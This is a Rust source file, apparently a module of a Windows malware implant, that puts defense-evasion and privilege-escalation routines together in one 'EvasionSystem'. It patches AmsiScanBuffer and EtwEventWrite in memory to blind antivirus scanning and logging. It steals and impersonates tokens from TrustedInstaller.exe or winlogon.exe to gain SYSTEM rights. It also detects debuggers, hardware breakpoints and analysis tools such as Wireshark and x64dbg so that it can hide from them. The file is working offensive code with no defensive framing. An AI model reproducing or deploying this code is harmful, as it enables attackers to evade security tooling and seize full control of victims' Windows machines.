use crate::{quantum, structs, dark_matter, dynamo};
use std::ffi::c_void;
use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken, GetCurrentThread, PROCESS_QUERY_INFORMATION, OpenProcess};
use windows::Win32::System::Diagnostics::Debug::{IsDebuggerPresent, GetThreadContext, CONTEXT, CONTEXT_FLAGS};
use windows::Win32::Security::{DuplicateTokenEx, ImpersonateLoggedOnUser, TOKEN_DUPLICATE, TOKEN_QUERY, TOKEN_IMPERSONATE, SecurityImpersonation, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, SE_PRIVILEGE_ENABLED, LookupPrivilegeValueA, LUID_AND_ATTRIBUTES};
use windows::Win32::System::Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS, PAGE_EXECUTE_READWRITE};
use windows::Win32::UI::WindowsAndMessaging::GetCursorPos;
use windows::core::PCSTR;

const CONTEXT_DEBUG_REGISTERS: u32 = 0x00100010; // CONTEXT_AMD64 | CONTEXT_DEBUG_REGISTERS

// --- EVASION ORCHESTRATOR ---
pub struct EvasionSystem;

impl EvasionSystem {
    pub fn new() -> Option<Self> {
        // 1. Blindfold System
        ShadowOps::blind_etw();
        ShadowOps::blind_amsi();

        // 2. Control (God Mode)
        // Enable privileges first
        GodMode::enable_debug_privilege();
        // Attempt TrustedInstaller -> Fallback to SYSTEM
        if !GodMode::become_god() {
            // Failed to become god? Maybe just stay as Admin.
        }

        // 3. Environment Checks
        if _check_debugger() { return None; }
        if _check_hardware_breakpoints() { return None; }
        if _check_hunter_processes_syscall() { return None; }
        
        // 4. Human / Heuristic Checks
        // (Skipping waiting checks for efficiency in this version unless needed)

        Some(EvasionSystem)
    }
}

// --- MODULE: GOD MODE (Privilege & Token Theft) ---
struct GodMode;
impl GodMode {
    pub fn enable_debug_privilege() -> bool {
        unsafe {
            let mut h_token = HANDLE::default();
            if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut h_token).is_ok() {
                let mut luid = windows::Win32::Foundation::LUID::default();
                let name = "SeDebugPrivilege\0";
                if LookupPrivilegeValueA(PCSTR::null(), PCSTR(name.as_ptr()), &mut luid).is_ok() {
                    let tp = TOKEN_PRIVILEGES {
                        PrivilegeCount: 1,
                        Privileges: [LUID_AND_ATTRIBUTES {
                            Luid: luid,
                            Attributes: SE_PRIVILEGE_ENABLED,
                        }],
                        ..Default::default()
                    };
                    let _ = windows::Win32::Security::AdjustTokenPrivileges(
                        h_token, 
                        false, 
                        Some(&tp), 
                        0, 
                        None, 
                        None
                    );
                    return true; 
                }
            }
        }
        false
    }

    pub fn become_god() -> bool {
        // Try TrustedInstaller first, then Winlogon
        if Self::steal_token("TrustedInstaller.exe") { return true; }
        if Self::steal_token("winlogon.exe") { return true; }
        false
    }

    fn steal_token(target_proc: &str) -> bool {
        unsafe {
            if let Some(pid) = _find_process_pid(target_proc) {
                 if let Ok(h_process) = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid) {
                    let mut h_token = HANDLE::default();
                    if OpenProcessToken(h_process, TOKEN_DUPLICATE | TOKEN_QUERY, &mut h_token).is_ok() {
                        let mut h_dup_token = HANDLE::default();
                        if DuplicateTokenEx(
                            h_token,
                            TOKEN_ADJUST_PRIVILEGES | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_DUPLICATE,
                            None,
                            SecurityImpersonation,
                            windows::Win32::Security::TokenImpersonation, 
                            &mut h_dup_token
                        ).is_ok() {
                            if ImpersonateLoggedOnUser(h_dup_token).is_ok() {
                                return true;
                            }
                        }
                    }
                 }
            }
        }
        false
    }
}

// --- MODULE: SHADOW OPS (Memory Patching) ---
struct ShadowOps;
impl ShadowOps {
    pub fn blind_amsi() {
        unsafe {
            if let Some(addr) = dynamo::Dynamo::get_func("amsi.dll\0", "AmsiScanBuffer\0") {
                // x64: mov eax, 0x80070057; ret
                let _ = Self::patch_memory(addr as *mut c_void, &[0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]); 
            }
        }
    }

    pub fn blind_etw() {
        unsafe {
            let ntdll = dark_matter::decrypt(dark_matter::NTDLL);
            if let Some(addr) = dynamo::Dynamo::get_func(&ntdll, "EtwEventWrite\0") {
                // x64: xor eax, eax; ret
                let _ = Self::patch_memory(addr as *mut c_void, &[0x33, 0xC0, 0xC3]);
            }
        }
    }

    unsafe fn patch_memory(addr: *mut c_void, patch: &[u8]) -> bool {
        let mut old_protect: PAGE_PROTECTION_FLAGS = Default::default();
        let size = patch.len();
        if VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, &mut old_protect).is_ok() {
            std::ptr::copy_nonoverlapping(patch.as_ptr(), addr as *mut u8, size);
            let mut temp: PAGE_PROTECTION_FLAGS = Default::default();
            let _ = VirtualProtect(addr, size, old_protect, &mut temp);
            return true;
        }
        false
    }
}

// --- UTILS: SCANNING & CHECKS ---

fn _find_process_pid(name: &str) -> Option<u32> {
    unsafe {
        if let Some(gate) = quantum::QuantumGate::new() {
            let buf_size = 1024 * 1024;
            let layout = std::alloc::Layout::from_size_align(buf_size, 8).unwrap();
            let buf = std::alloc::alloc(layout) as *mut c_void;
            let mut ret_len = 0;
            
            let status = gate.query_system_info(structs::SYSTEM_PROCESS_INFORMATION_CLASS, buf, buf_size as u32, &mut ret_len);
            
            let mut target_pid = None;
            if status == 0 {
                let mut current_ptr = buf as *const u8;
                loop {
                    let info = &*(current_ptr as *const structs::SYSTEM_PROCESS_INFORMATION);
                    
                    if !info.ImageName.Buffer.is_null() && info.ImageName.Length > 0 {
                        let buffer_ptr = info.ImageName.Buffer.as_ptr();
                        let slice = std::slice::from_raw_parts(buffer_ptr, (info.ImageName.Length / 2) as usize);
                        let name_string = String::from_utf16_lossy(slice).to_lowercase();
                        
                        if name_string == name.to_lowercase() {
                            target_pid = Some(info.UniqueProcessId.0 as u32);
                            break;
                        }
                    }

                    if info.NextEntryOffset == 0 { break; }
                    current_ptr = current_ptr.add(info.NextEntryOffset as usize);
                }
            }
            std::alloc::dealloc(buf as *mut u8, layout);
            return target_pid;
        }
    }
    None
}

fn _check_debugger() -> bool {
    unsafe { IsDebuggerPresent().as_bool() }
}

fn _check_hardware_breakpoints() -> bool {
    unsafe {
        let mut context = CONTEXT::default();
        context.ContextFlags = CONTEXT_FLAGS(CONTEXT_DEBUG_REGISTERS); 
        if GetThreadContext(GetCurrentThread(), &mut context).is_ok() {
             if context.Dr0 != 0 || context.Dr1 != 0 || context.Dr2 != 0 || context.Dr3 != 0 {
                return true; 
            }
        }
    }
    false
}

fn _check_hunter_processes_syscall() -> bool {
    // Reusing the PID finder logic technically, but we want to scan ALL names.
    // Simplifying: Just define a blacklist logic here using the same query.
    unsafe {
        if let Some(gate) = quantum::QuantumGate::new() {
            let buf_size = 1024 * 1024;
            let layout = std::alloc::Layout::from_size_align(buf_size, 8).unwrap();
            let buf = std::alloc::alloc(layout) as *mut c_void;
            let mut ret_len = 0;
            let status = gate.query_system_info(structs::SYSTEM_PROCESS_INFORMATION_CLASS, buf, buf_size as u32, &mut ret_len);
            
            if status == 0 { 
                let mut current_ptr = buf as *const u8;
                loop {
                    let info = &*(current_ptr as *const structs::SYSTEM_PROCESS_INFORMATION);
                    if !info.ImageName.Buffer.is_null() && info.ImageName.Length > 0 {
                        let buffer_ptr = info.ImageName.Buffer.as_ptr();
                        let slice = std::slice::from_raw_parts(buffer_ptr, (info.ImageName.Length / 2) as usize);
                        let name_string = String::from_utf16_lossy(slice).to_lowercase();
                        if name_string.contains("wireshark") || name_string.contains("procmon") || name_string.contains("x64dbg") || name_string.contains("fiddler") {
                               std::alloc::dealloc(buf as *mut u8, layout);
                               return true;
                        }
                    }
                    if info.NextEntryOffset == 0 { break; }
                    current_ptr = current_ptr.add(info.NextEntryOffset as usize);
                }
            }
            std::alloc::dealloc(buf as *mut u8, layout);
        }
    }
    false
}

pub fn verify_human_presence() {
    unsafe {
        let mut p1 = std::mem::zeroed();
        let _ = GetCursorPos(&mut p1);
        quantum::quantum_sleep(200); 
        let mut p2 = std::mem::zeroed();
        let _ = GetCursorPos(&mut p2);
    }
}

pub fn am_i_admin() -> bool { true } // Assumed for optimizing logic flow
pub fn elevate_self() {}
pub fn pump_heartbeat() {}
